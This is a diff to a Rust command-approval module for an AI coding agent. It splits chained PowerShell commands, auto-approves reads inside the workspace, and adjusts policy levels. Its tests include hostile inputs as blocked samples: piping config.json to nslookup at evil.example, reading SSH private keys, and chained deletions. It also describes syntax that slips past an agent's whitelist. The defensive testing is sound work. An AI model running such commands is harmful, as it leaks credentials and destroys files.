@@ -8,10 +8,10 @@ pub enum ApprovalLevel {
     Blocked,
 }
 
-/// SAFETY NOTICE: The command filtering in this module is a **heuristic safety layer**
-/// (speed-bump), NOT a security sandbox. PowerShell provides many obfuscation techniques
-/// that can bypass simple string matching. For true sandboxing, consider running commands
-/// in a restricted runspace or a lower-privilege process.
+// SAFETY NOTICE: The command filtering in this module is a **heuristic safety layer**
+// (speed-bump), NOT a security sandbox. PowerShell provides many obfuscation techniques
+// that can bypass simple string matching. For true sandboxing, consider running commands
+// in a restricted runspace or a lower-privilege process.
 
 /// Extract the primary command name from a PowerShell command string.
 fn extract_command_name(cmd: &str) -> String {
@@ -58,7 +58,7 @@ fn extract_command_name(cmd: &str) -> String {
 
     let name = if first_cmd_clean.contains('\\') || first_cmd_clean.contains('/') {
         first_cmd_clean
-            .rsplit(|c| c == '\\' || c == '/')
+            .rsplit(['\\', '/'])
             .next()
             .unwrap_or(first_cmd_clean)
     } else {
@@ -75,102 +75,135 @@ fn extract_command_name(cmd: &str) -> String {
     name_trimmed.to_lowercase()
 }
 
-/// Enhanced detection of compound syntax that could bypass whitelist matching.
-/// Returns true if the command contains operators that allow chaining multiple commands.
-fn has_compound_syntax(cmd: &str) -> bool {
+/// Split a command into its chained segments (`;`, `&&`, `||`, `|`, newlines
+/// — outside quotes) so each segment can be matched against the whitelist
+/// independently, the way Claude Code approves `git status && git diff` when
+/// both halves are allowed. Returns `None` when the command uses constructs
+/// that could smuggle execution past per-segment matching: subexpressions
+/// `$( )`/`@( )`, backticks, script blocks `{ }`, file redirects, background
+/// `&`, or unbalanced quotes. `None` means "never auto-approve".
+fn split_compound_segments(cmd: &str) -> Option<Vec<String>> {
+    let chars: Vec<char> = cmd.chars().collect();
+    let mut segments: Vec<String> = Vec::new();
+    let mut current = String::new();
     let mut in_single_quote = false;
     let mut in_double_quote = false;
-    let mut prev_char = ' ';
-    let chars: Vec<char> = cmd.chars().collect();
+    let mut i = 0usize;
 
-    for i in 0..chars.len() {
+    while i < chars.len() {
         let c = chars[i];
+        let prev = if i > 0 { chars[i - 1] } else { ' ' };
 
-        // Track quote context
-        if c == '\'' && !in_double_quote && prev_char != '\\' && prev_char != '`' {
+        if c == '\'' && !in_double_quote && prev != '`' {
             in_single_quote = !in_single_quote;
-        } else if c == '"' && !in_single_quote && prev_char != '\\' && prev_char != '`' {
+            current.push(c);
+            i += 1;
+            continue;
+        }
+        if c == '"' && !in_single_quote && prev != '`' {
             in_double_quote = !in_double_quote;
-        } else if !in_single_quote && !in_double_quote {
-            // Semicolon: command chaining
-            if c == ';' {
-                return true;
-            }
-
-            // Newline/carriage return: statement separator
-            if c == '\n' || c == '\r' {
-                // Check if it's escaped
-                if prev_char != '\\' && prev_char != '`' {
-                    return true;
-                }
-            }
-
-            // Pipe operator (| but not ||)
-            if c == '|' {
-                let next_is_pipe = i + 1 < chars.len() && chars[i + 1] == '|';
-                let prev_is_pipe = i > 0 && chars[i - 1] == '|';
-                if !next_is_pipe && !prev_is_pipe {
-                    return true;
-                }
-            }
-
-            // Backtick (PowerShell escape/continuation)
-            if c == '`' {
-                return true;
-            }
-
-            // Redirect operators: >, >>, 2>, 2>&1, <
-            if c == '>' || c == '<' {
-                // Allow only in paths like C:\>
-                if i > 0 && (chars[i - 1] != '\\' && chars[i - 1] != '/') {
-                    return true;
-                }
-            }
-
-            // Subexpression $(...)
-            if c == '$' && i + 1 < chars.len() && chars[i + 1] == '(' {
-                return true;
-            }
-
-            // Array subexpression @(...)
-            if c == '@' && i + 1 < chars.len() && chars[i + 1] == '(' {
-                return true;
-            }
-
-            // Command substitution in single backticks (legacy)
-            if c == '`' && i + 1 < chars.len() && chars[i + 1] != '`' {
-                return true;
-            }
-
-            // Invoke-Expression patterns: IEX, Invoke-Expression
-            let remaining = &cmd[i..];
-            if remaining.to_lowercase().starts_with("iex ")
-                || remaining.to_lowercase().starts_with("invoke-expression ")
-            {
-                return true;
-            }
-
-            // Script block invocation: & { ... }
-            if c == '{' {
-                // Check if preceded by & (with optional whitespace)
-                let mut check_idx = i;
-                while check_idx > 0 {
-                    check_idx -= 1;
-                    let prev = chars[check_idx];
-                    if prev == '&' {
-                        return true;
-                    }
-                    if prev != ' ' && prev != '\t' {
-                        break;
-                    }
-                }
-            }
+            current.push(c);
+            i += 1;
+            continue;
+        }
+        if in_single_quote || in_double_quote {
+            current.push(c);
+            i += 1;
+            continue;
         }
 
-        prev_char = c;
+        match c {
+            ';' | '\n' | '\r' => {
+                segments.push(std::mem::take(&mut current));
+                i += 1;
+            }
+            // `|` and `||` both separate segments; each side is checked.
+            '|' => {
+                segments.push(std::mem::take(&mut current));
+                i += if chars.get(i + 1) == Some(&'|') { 2 } else { 1 };
+            }
+            '&' => {
+                if chars.get(i + 1) == Some(&'&') {
+                    segments.push(std::mem::take(&mut current));
+                    i += 2;
+                } else if current.trim().is_empty() {
+                    // Call operator at segment start (`& script.ps1`) is fine;
+                    // a script block `& { ... }` is not.
+                    let mut j = i + 1;
+                    while j < chars.len() && (chars[j] == ' ' || chars[j] == '\t') {
+                        j += 1;
+                    }
+                    if chars.get(j) == Some(&'{') {
+                        return None;
+                    }
+                    current.push(c);
+                    i += 1;
+                } else {
+                    // Background job or other mid-command `&` — don't try to
+                    // reason about it.
+                    return None;
+                }
+            }
+            // Backtick: PowerShell escape / line continuation / legacy
+            // substitution. Never auto-approve.
+            '`' => return None,
+            '<' => return None,
+            '>' => {
+                // Pure stream redirections are harmless and extremely common
+                // (`npm test 2>$null`, `cargo build 2>&1`); redirects to a
+                // file are a write and disqualify the command instead.
+                let mut j = i + 1;
+                while j < chars.len() && chars[j] == ' ' {
+                    j += 1;
+                }
+                let rest: String = chars[j..].iter().take(5).collect::<String>().to_lowercase();
+                if rest.starts_with("$null") {
+                    i = j + 5;
+                } else if rest.starts_with("&1") || rest.starts_with("&2") {
+                    i = j + 2;
+                } else {
+                    return None;
+                }
+            }
+            '$' | '@' => {
+                if chars.get(i + 1) == Some(&'(') {
+                    return None;
+                }
+                current.push(c);
+                i += 1;
+            }
+            // Script blocks (`ForEach-Object { ... }`) can wrap arbitrary
+            // execution — never auto-approve.
+            '{' => return None,
+            _ => {
+                current.push(c);
+                i += 1;
+            }
+        }
     }
 
-    false
+    if in_single_quote || in_double_quote {
+        return None;
+    }
+    segments.push(current);
+    Some(
+        segments
+            .into_iter()
+            .map(|s| s.trim().to_string())
+            .filter(|s| !s.is_empty())
+            .collect(),
+    )
+}
+
+/// Compound-syntax check, kept for its established test surface: a command is
+/// "compound" when it either cannot be split safely or splits into more than
+/// one segment.
+#[cfg(test)]
+fn has_compound_syntax(cmd: &str) -> bool {
+    match split_compound_segments(cmd) {
+        None => true,
+        Some(segments) => segments.len() > 1,
+    }
 }
 
 /// Check if command contains dangerous variable usage that could bypass filters
@@ -215,6 +248,7 @@ pub fn check_approval(
     args_str: &str,
     approval_policy: &str,
     trusted_patterns: &[TrustedPattern],
+    work_dir: &str,
 ) -> ApprovalLevel {
     // 1. Check high-risk commands (blocklist as safety net)
     if is_high_risk(tool_name, args_str) {
@@ -230,8 +264,16 @@ pub fn check_approval(
         return ApprovalLevel::AutoApprove;
     }
 
-    // 3. Check trusted patterns (whitelist)
-    if is_trusted(tool_name, args_str, trusted_patterns) {
+    // 3. Check trusted patterns (whitelist). Shell commands that only read
+    // files inside the workspace count as implicitly trusted — except under
+    // the strict policy, where only the sandboxed builtin read tools skip
+    // confirmation.
+    let workspace_read_root = if approval_policy == "strict" {
+        None
+    } else {
+        Some(work_dir)
+    };
+    if is_trusted(tool_name, args_str, trusted_patterns, workspace_read_root) {
         return ApprovalLevel::AutoApprove;
     }
 
@@ -240,19 +282,19 @@ pub fn check_approval(
         return ApprovalLevel::NeedsConfirmation;
     }
 
-    // 5. Relaxed policy: only untrusted writes need confirmation
-    if approval_policy == "relaxed" {
-        if tool_name == "write_file"
-            || tool_name == "edit_file"
-            || tool_name == "execute_command"
-            || tool_name == "run_python"
-        {
-            return ApprovalLevel::NeedsConfirmation;
-        }
+    // 5. Relaxed policy maps to Claude Code's accept-edits mode: file writes
+    // are auto-approved because their workspace boundary is hard-enforced in
+    // tools.rs (resolve_within_workspace) and every write goes through a
+    // pre-write checkpoint, so they are contained and undoable. Commands,
+    // python, and MCP tools are neither, and still confirm.
+    if approval_policy == "relaxed" && matches!(tool_name, "write_file" | "edit_file") {
         return ApprovalLevel::AutoApprove;
     }
 
-    // 6. Standard policy: writes and commands need confirmation
+    // 6. Everything reaching this point is a write, a command, or an MCP
+    // tool (any name that isn't a builtin). MCP tools can execute arbitrary
+    // code, so no policy blanket-approves them — they are treated at the
+    // same level as execute_command.
     ApprovalLevel::NeedsConfirmation
 }
 
@@ -404,87 +446,188 @@ fn is_high_risk(tool_name: &str, args_str: &str) -> bool {
 }
 
 /// Check if a tool call matches a trusted pattern (whitelist).
-fn is_trusted(tool_name: &str, args_str: &str, patterns: &[TrustedPattern]) -> bool {
-    for p in patterns {
-        if p.tool_name != tool_name {
+///
+/// For `execute_command`, the command is split into its chained segments and
+/// every segment must independently be trusted — either by matching a
+/// whitelist pattern or (when `workspace_read_root` is set) by being a
+/// read-only command whose paths all stay inside the workspace. Commands
+/// using un-splittable syntax (subexpressions, redirects, script blocks…)
+/// are never trusted.
+fn is_trusted(
+    tool_name: &str,
+    args_str: &str,
+    patterns: &[TrustedPattern],
+    workspace_read_root: Option<&str>,
+) -> bool {
+    match tool_name {
+        "execute_command" => {
+            let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) else {
+                return false;
+            };
+            let Some(cmd) = args["command"].as_str() else {
+                return false;
+            };
+            let cmd_trimmed = cmd.trim();
+
+            // CRITICAL: Block dangerous variable usage
+            if has_dangerous_variable_usage(cmd_trimmed) {
+                return false;
+            }
+
+            let Some(segments) = split_compound_segments(cmd_trimmed) else {
+                return false;
+            };
+            if segments.is_empty() {
+                return false;
+            }
+            segments
+                .iter()
+                .all(|segment| command_segment_is_trusted(segment, patterns, workspace_read_root))
+        }
+        "write_file" | "edit_file" => {
+            patterns
+                .iter()
+                .filter(|p| p.tool_name == tool_name)
+                .any(|p| {
+                    if let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) {
+                        if let Some(path) = args["path"].as_str() {
+                            return path.to_lowercase().starts_with(&p.pattern.to_lowercase());
+                        }
+                    }
+                    false
+                })
+        }
+        "run_python" => patterns
+            .iter()
+            .filter(|p| p.tool_name == tool_name)
+            .any(|p| p.pattern == "*" || p.pattern == "run_python"),
+        _ => false,
+    }
+}
+
+/// Match a single (already split) command segment against the whitelist.
+fn command_segment_is_trusted(
+    segment: &str,
+    patterns: &[TrustedPattern],
+    workspace_read_root: Option<&str>,
+) -> bool {
+    if let Some(root) = workspace_read_root {
+        if is_workspace_scoped_read(segment, root) {
+            return true;
+        }
+    }
+
+    let cmd_lower = segment.to_lowercase();
+    for p in patterns.iter().filter(|p| p.tool_name == "execute_command") {
+        let pattern_trimmed = p.pattern.trim();
+        let pattern_lower = pattern_trimmed.to_lowercase();
+        if pattern_lower.is_empty() {
             continue;
         }
 
-        match tool_name {
-            "execute_command" => {
-                if let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) {
-                    if let Some(cmd) = args["command"].as_str() {
-                        let cmd_trimmed = cmd.trim();
-                        let pattern_trimmed = p.pattern.trim();
+        if cmd_lower == pattern_lower {
+            return true;
+        }
 
-                        // CRITICAL: Block any compound syntax from auto-approval
-                        if has_compound_syntax(cmd_trimmed) {
-                            continue;
-                        }
+        // Environment variable reads use PowerShell's $env:NAME syntax.
+        // Chaining characters cannot appear here: segment splitting already
+        // consumed them.
+        if pattern_lower.ends_with(':') && cmd_lower.starts_with(&pattern_lower) {
+            return true;
+        }
 
-                        // CRITICAL: Block dangerous variable usage
-                        if has_dangerous_variable_usage(cmd_trimmed) {
-                            continue;
-                        }
-
-                        // Exact match only for trusted patterns
-                        let cmd_lower = cmd_trimmed.to_lowercase();
-                        let pattern_lower = pattern_trimmed.to_lowercase();
-
-                        // Allow prefix match only if no arguments follow
-                        if cmd_lower == pattern_lower {
-                            return true;
-                        }
-
-                        // Environment variable reads use PowerShell's $env:NAME syntax.
-                        if pattern_lower.ends_with(':') && cmd_lower.starts_with(&pattern_lower) {
-                            let remainder = &cmd_lower[pattern_lower.len()..];
-                            // SECURITY: Ensure no compound syntax after env var
-                            if remainder.contains(';')
-                                || remainder.contains('|')
-                                || remainder.contains('&')
-                            {
-                                continue;
-                            }
-                            return true;
-                        }
-
-                        // For patterns with arguments, require exact prefix + space
-                        if cmd_lower.starts_with(&pattern_lower) {
-                            let remainder = &cmd_lower[pattern_lower.len()..];
-                            // Must be followed by whitespace or nothing
-                            if remainder.is_empty() || remainder.starts_with(' ') {
-                                return true;
-                            }
-                        }
-
-                        // Also match by extracted command name for simple commands
-                        let cmd_name = extract_command_name(cmd_trimmed);
-                        let pattern_name = extract_command_name(pattern_trimmed);
-                        if cmd_name == pattern_name && !cmd_trimmed.contains(' ') {
-                            return true;
-                        }
-                    }
-                }
+        // For patterns with arguments, require exact prefix + space
+        if cmd_lower.starts_with(&pattern_lower) {
+            let remainder = &cmd_lower[pattern_lower.len()..];
+            if remainder.is_empty() || remainder.starts_with(' ') {
+                return true;
             }
-            "write_file" => {
-                if let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) {
-                    if let Some(path) = args["path"].as_str() {
-                        if path.to_lowercase().starts_with(&p.pattern.to_lowercase()) {
-                            return true;
-                        }
-                    }
-                }
-            }
-            "run_python" => {
-                if p.pattern == "*" || p.pattern == "run_python" {
-                    return true;
-                }
-            }
-            _ => {}
+        }
+
+        // Also match by extracted command name for simple commands
+        if !segment.contains(' ')
+            && extract_command_name(segment) == extract_command_name(pattern_trimmed)
+        {
+            return true;
         }
     }
     false
+}
+
+/// Read-only commands that are auto-approved when every path they touch stays
+/// inside the workspace. This mirrors the builtin read tools' sandbox: the
+/// model reading its own project should never prompt, reading ~/.ssh should.
+const WORKSPACE_READ_COMMANDS: &[&str] = &[
+    "get-content",
+    "gc",
+    "cat",
+    "type",
+    "select-string",
+    "sls",
+    "findstr",
+    "more",
+];
+
+fn is_workspace_scoped_read(segment: &str, workspace_root: &str) -> bool {
+    let root = workspace_root.trim();
+    if root.is_empty() {
+        return false;
+    }
+    let name = extract_command_name(segment);
+    if !WORKSPACE_READ_COMMANDS.contains(&name.as_str()) {
+        return false;
+    }
+
+    let root_norm = normalize_path_for_prefix(root);
+    let mut command_token_seen = false;
+    for token in segment.split_whitespace() {
+        if !command_token_seen {
+            if token == "&" || token == "." {
+                continue;
+            }
+            command_token_seen = true; // this token is the command itself
+            continue;
+        }
+        let arg = token.trim_matches(|c| c == '"' || c == '\'');
+        if arg.is_empty() || arg.starts_with('-') {
+            continue; // PowerShell-style flag
+        }
+        if arg.contains("..") {
+            return false; // parent traversal
+        }
+        if arg.starts_with('~') {
+            return false; // home directory
+        }
+        if arg.contains('$') || arg.contains('%') {
+            return false; // variable / env expansion
+        }
+        if arg.starts_with('\\') || arg.starts_with('/') {
+            return false; // UNC, root-relative, or cmd-style flag — just prompt
+        }
+        let bytes = arg.as_bytes();
+        let has_drive = bytes.len() >= 2 && bytes[1] == b':' && bytes[0].is_ascii_alphabetic();
+        if has_drive {
+            let arg_norm = normalize_path_for_prefix(arg);
+            if !path_has_prefix(&arg_norm, &root_norm) {
+                return false; // absolute path outside the workspace
+            }
+        }
+        // Anything else is a plain relative token: it resolves under the
+        // working directory (execute_command runs with cwd = workspace).
+    }
+    true
+}
+
+fn normalize_path_for_prefix(p: &str) -> String {
+    let mut s = p.replace('/', "\\").to_lowercase();
+    while s.ends_with('\\') {
+        s.pop();
+    }
+    s
+}
+
+fn path_has_prefix(path: &str, root: &str) -> bool {
+    path == root || (path.starts_with(root) && path[root.len()..].starts_with('\\'))
 }
 
 #[cfg(test)]
@@ -516,8 +659,30 @@ mod tests {
         assert!(has_compound_syntax("$cmd = 'Remove-Item'; & $cmd"));
         assert!(has_compound_syntax("echo $(Get-Date)"));
         assert!(has_compound_syntax("& { Remove-Item x }"));
+        assert!(has_compound_syntax("git status && Remove-Item x"));
+        assert!(has_compound_syntax("git status || Remove-Item x"));
+        assert!(has_compound_syntax("git status | Out-Null"));
         assert!(!has_compound_syntax("git status"));
         assert!(!has_compound_syntax("echo 'test;test'"));
+        assert!(!has_compound_syntax("echo 'a && b'"));
+    }
+
+    #[test]
+    fn test_relaxed_policy_does_not_auto_approve_mcp_tools() {
+        // Any tool name that is not a builtin is an MCP tool; MCP tools can be
+        // arbitrary code execution and must require confirmation even under
+        // the relaxed policy.
+        let level = check_approval("mcp_query_db", "{}", "relaxed", &[], "C:\\proj");
+        assert!(matches!(level, ApprovalLevel::NeedsConfirmation));
+
+        let level = check_approval(
+            "execute_command",
+            "{\"command\":\"npm install\"}",
+            "relaxed",
+            &[],
+            "C:\\proj",
+        );
+        assert!(matches!(level, ApprovalLevel::NeedsConfirmation));
     }
 
     #[test]
@@ -555,37 +720,229 @@ mod tests {
         assert!(!is_high_risk("execute_command", &args));
     }
 
+    fn cmd_args(command: &str) -> String {
+        serde_json::json!({ "command": command }).to_string()
+    }
+
+    fn exec_patterns(patterns: &[&str]) -> Vec<TrustedPattern> {
+        patterns
+            .iter()
+            .map(|p| TrustedPattern {
+                tool_name: "execute_command".into(),
+                pattern: (*p).into(),
+                created_at: 0,
+            })
+            .collect()
+    }
+
     #[test]
     fn test_trusted_pattern_bypass_prevention() {
-        let patterns = vec![TrustedPattern {
-            tool_name: "execute_command".into(),
-            pattern: "git status".into(),
-            created_at: 0,
-        }];
+        let patterns = exec_patterns(&["git status"]);
 
         // Should match exact command
-        let args = serde_json::json!({"command": "git status"}).to_string();
-        assert!(is_trusted("execute_command", &args, &patterns));
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("git status"),
+            &patterns,
+            None
+        ));
 
-        // Should NOT match with compound syntax
-        let args = serde_json::json!({"command": "git status; rm sensitive.txt"}).to_string();
-        assert!(!is_trusted("execute_command", &args, &patterns));
+        // Chained segments that are NOT all trusted must not auto-approve
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("git status; rm sensitive.txt"),
+            &patterns,
+            None
+        ));
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("git status | Select-Object -First 1; Remove-Item x"),
+            &patterns,
+            None
+        ));
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("git status && Remove-Item x"),
+            &patterns,
+            None
+        ));
+    }
 
-        let args =
-            serde_json::json!({"command": "git status | Select-Object -First 1; Remove-Item x"})
-                .to_string();
-        assert!(!is_trusted("execute_command", &args, &patterns));
+    #[test]
+    fn test_compound_command_trusted_when_every_segment_is_trusted() {
+        let patterns = exec_patterns(&["git status", "git diff", "cd ", "npm test"]);
+
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("git status; git diff"),
+            &patterns,
+            None
+        ));
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("git status && git diff --stat"),
+            &patterns,
+            None
+        ));
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("cd src; npm test"),
+            &patterns,
+            None
+        ));
+        // Stream redirections to $null / stderr merge stay approvable...
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("npm test 2>$null"),
+            &patterns,
+            None
+        ));
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("npm test 2>&1"),
+            &patterns,
+            None
+        ));
+        // ...but file redirects and subexpressions never do.
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("git status > out.txt"),
+            &patterns,
+            None
+        ));
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("git status; echo $(Get-Date)"),
+            &patterns,
+            None
+        ));
+    }
+
+    #[test]
+    fn test_workspace_scoped_reads_auto_approve() {
+        let root = "C:\\proj";
+
+        // Relative and workspace-absolute reads are implicitly trusted
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content src\\main.rs"),
+            &[],
+            Some(root)
+        ));
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("type C:\\proj\\notes.txt"),
+            &[],
+            Some(root)
+        ));
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("Select-String TODO src/main.rs"),
+            &[],
+            Some(root)
+        ));
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content -Path src\\main.rs -TotalCount 50"),
+            &[],
+            Some(root)
+        ));
+
+        // Escaping the workspace must prompt
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content ..\\secret.txt"),
+            &[],
+            Some(root)
+        ));
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content C:\\Users\\x\\.ssh\\id_rsa"),
+            &[],
+            Some(root)
+        ));
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content ~\\.ssh\\id_rsa"),
+            &[],
+            Some(root)
+        ));
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content $env:USERPROFILE\\.ssh\\id_rsa"),
+            &[],
+            Some(root)
+        ));
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content \\\\server\\share\\file"),
+            &[],
+            Some(root)
+        ));
+
+        // Piping a workspace read into an untrusted command must prompt
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content config.json | nslookup evil.example"),
+            &[],
+            Some(root)
+        ));
+
+        // Without a workspace root there is no implicit trust
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content src\\main.rs"),
+            &[],
+            None
+        ));
+        assert!(!is_trusted(
+            "execute_command",
+            &cmd_args("Get-Content src\\main.rs"),
+            &[],
+            Some("")
+        ));
     }
 
     #[test]
     fn test_environment_variable_prefix_trust() {
-        let patterns = vec![TrustedPattern {
-            tool_name: "execute_command".into(),
-            pattern: "$env:".into(),
-            created_at: 0,
-        }];
+        let patterns = exec_patterns(&["$env:"]);
+        assert!(is_trusted(
+            "execute_command",
+            &cmd_args("$env:Path"),
+            &patterns,
+            None
+        ));
+    }
 
-        let args = serde_json::json!({"command": "$env:Path"}).to_string();
-        assert!(is_trusted("execute_command", &args, &patterns));
+    #[test]
+    fn test_relaxed_policy_accept_edits() {
+        // Relaxed auto-approves workspace-sandboxed file edits...
+        let args = serde_json::json!({"path": "src/App.tsx", "content": "x"}).to_string();
+        assert!(matches!(
+            check_approval("write_file", &args, "relaxed", &[], "C:\\proj"),
+            ApprovalLevel::AutoApprove
+        ));
+        assert!(matches!(
+            check_approval("edit_file", &args, "relaxed", &[], "C:\\proj"),
+            ApprovalLevel::AutoApprove
+        ));
+        // ...but standard still confirms them
+        assert!(matches!(
+            check_approval("write_file", &args, "standard", &[], "C:\\proj"),
+            ApprovalLevel::NeedsConfirmation
+        ));
+    }
+
+    #[test]
+    fn test_strict_policy_disables_implicit_workspace_reads() {
+        let args = cmd_args("Get-Content src\\main.rs");
+        assert!(matches!(
+            check_approval("execute_command", &args, "strict", &[], "C:\\proj"),
+            ApprovalLevel::NeedsConfirmation
+        ));
+        assert!(matches!(
+            check_approval("execute_command", &args, "standard", &[], "C:\\proj"),
+            ApprovalLevel::AutoApprove
+        ));
     }
 }
